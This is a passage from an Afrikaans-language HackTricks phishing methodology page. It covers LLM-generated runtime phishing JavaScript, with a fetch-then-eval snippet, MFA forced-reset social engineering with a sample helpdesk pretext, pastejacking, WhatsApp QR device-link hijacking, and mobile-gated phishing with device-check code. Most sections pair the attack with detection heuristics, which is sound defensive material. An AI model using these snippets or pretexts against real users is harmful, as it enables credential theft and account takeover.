2. **Client-side API call:** wanneer die bladsy laai, roep JS ’n publieke LLM (Gemini/DeepSeek/etc.) of ’n CDN-proxy aan; slegs die prompt/API-call is in die statiese HTML teenwoordig.
3. **Assemble & exec:** voeg die response saam en voer dit uit (polimorfies per besoek):
```javascript
fetch("https://llm.example/v1/chat",{method:"POST",body:JSON.stringify({messages:[{role:"user",content:promptText}]}),headers:{"Content-Type":"application/json",Authorization:`Bearer ${apiKey}`}})
.then(r=>r.json())
.then(j=>{const payload=j.choices?.[0]?.message?.content; eval(payload);});
```
4. **Phish/exfil:** gegenereerde kode personaliseer die lokmiddel (bv. LogoKit-tokenontleding) en stuur creds na die prompt-verborge eindpunt.

**Ontduikingseienskappe**
- Verkeer tref bekende LLM-domeine of betroubare CDN-proxies; soms via WebSockets na ’n backend.
- Geen statiese payload nie; kwaadwillige JS bestaan slegs ná rendering.
- Nie-deterministiese generering lewer **unieke stealers** per sessie.

**Bespeuringsidees**
- Laat sandboxes met JS geaktiveer loop; merk **runtime `eval`/dinamiese skripskepping afkomstig van LLM-antwoorde**.
- Soek na front-end POST-versoeke na LLM APIs wat onmiddellik gevolg word deur `eval`/`Function` op teruggestuurde teks.
- Genereer ’n waarskuwing vir ongemagtigde LLM-domeine in kliëntverkeer, gevolg deur credential-POST-versoeke.

---

## MFA Fatigue / Push Bombing Variant – Forced Reset
Benewens klassieke push-bombing, **dwing operateurs eenvoudig ’n nuwe MFA-registrasie af** tydens die helpdesk-oproep, wat die gebruiker se bestaande token ongeldig maak.  Enige daaropvolgende aanmeldingsprompt lyk vir die slagoffer legitiem.
```text
[Attacker]  →  Help-Desk:  “I lost my phone while travelling, can you unenrol it so I can add a new authenticator?”
[Help-Desk] →  AzureAD: ‘Delete existing methods’ → sends registration e-mail
[Attacker]  →  Completes new TOTP enrolment on their own device
```
Monitor vir AzureAD/AWS/Okta-gebeurtenisse waar **`deleteMFA` + `addMFA`** **binne minute vanaf dieselfde IP-adres** plaasvind.



## Clipboard Hijacking / Pastejacking

Aanvallers kan kwaadwillige opdragte ongemerk vanaf ’n gekompromitteerde of typosquatted-webblad na die slagoffer se clipboard kopieer en die gebruiker dan mislei om dit binne **Win + R**, **Win + X** of ’n terminaalvenster te plak, waardeur arbitrêre code uitgevoer word sonder enige aflaai of aanhangsel.


{{#ref}}
clipboard-hijacking.md
{{#endref}}

## Mobile Phishing & Verspreiding van kwaadwillige Apps (Android & iOS)


{{#ref}}
mobile-phishing-malicious-apps.md
{{#endref}}

### WhatsApp device-linking hijack via QR social engineering
* ’n Lokbladsy (byvoorbeeld ’n vals ministerie/CERT-“channel”) vertoon ’n WhatsApp Web/Desktop-QR-kode en gee die slagoffer opdrag om dit te skandeer, wat die aanvaller ongemerk as ’n **linked device** byvoeg.<sup>[[10]](#references)</sup>
* Die aanvaller kry onmiddellik sigbaarheid van kletse/kontakte totdat die sessie verwyder word. Slagoffers kan later ’n “new device linked”-kennisgewing sien; verdedigers kan soek na onverwagte device-link-gebeurtenisse kort ná besoeke aan onbetroubare QR-bladsye.

### Mobile‑gated phishing to evade crawlers/sandboxes
Operateurs plaas toenemend hul phishing-vloei agter ’n eenvoudige toestelkontrole sodat desktop-crawlers nooit die finale bladsye bereik nie. ’n Algemene patroon is ’n klein script wat toets of die DOM touch-capable is en die resultaat na ’n bediener-endpoint stuur; nie-mobile clients ontvang HTTP 500 (of ’n leë bladsy), terwyl mobiele gebruikers die volledige vloei bedien word.<sup>[[6]](#references)</sup>

Minimal client snippet (tipiese logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js`-logika (vereenvoudig):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Bedienergedrag wat dikwels waargeneem word:
- Stel 'n sessiekoekie tydens die eerste laai.
- Aanvaar `POST /detect {"is_mobile":true|false}`.
- Gee 500 (of 'n plekhouer) vir daaropvolgende GET-versoeke wanneer `is_mobile=false`; bedien phishing slegs indien `true`.

Heuristieke vir opsporing en identifisering:
- urlscan-navraag: `filename:"detect_device.js" AND page.status:500`
- Webtelemetrie: volgorde van `GET /static/detect_device.js` → `POST /detect` → HTTP 500 vir nie-mobiele toestelle; wettige mobiele slagofferpaaie gee 200 terug met daaropvolgende HTML/JS.
- Blokkeer of ondersoek bladsye wat inhoud uitsluitlik op `ontouchstart` of soortgelyke toestelkontroles baseer.

Verdedigingswenke:
- Voer crawlers met mobiele vingerafdrukke en JS geaktiveer uit om afgesperde inhoud te onthul.
- Genereer waarskuwings vir verdagte 500-antwoorde ná `POST /detect` op nuut geregistreerde domains.

## Verwysings

- [1] [Generering van domeinvariasies wat in phishing gebruik word (Zeltser)](https://zeltser.com/domain-name-variations-in-phishing/)
- [2] [Vind van phishing: Gereedskap en tegnieke (0xPatrik)](https://0xpatrik.com/phishing-domains/)
- [3] [Diefstal van sessies en omseiling van 2FA met EvilnoVNC (darkbyte.net)](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [4] [Hoe om DKIM met Postfix op Debian Wheezy te installeer en op te stel (DigitalOcean)](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [5] [2025 Unit 42 Global Incident Response Report – Sosiale-ingenieurswese-uitgawe](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [6] [Silent Smishing – mobiele-gereëlde phishing-infrastruktuur en heuristieke (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [7] [Die volgende grens van Runtime Assembly-aanvalle: Benutting van LLMs om phishing-JavaScript intyds te genereer](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [8] [Nabootsing, klik-kaping en TDS: Binne 'n malware-verspreidingsekosisteem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)
- [9] [Kaping van verkeer na Microsoft se windows.com met bitflipping (BleepingComputer)](https://www.bleepingcomputer.com/news/security/hijacking-traffic-to-microsoft-s-windowscom-with-bitflipping/)
- [10] [Liefde? Eintlik: Vals dating-app as lokmiddel in geteikende spyware-veldtog in Pakistan gebruik](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [11] [ESET GhostChat IoCs en voorbeelde](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
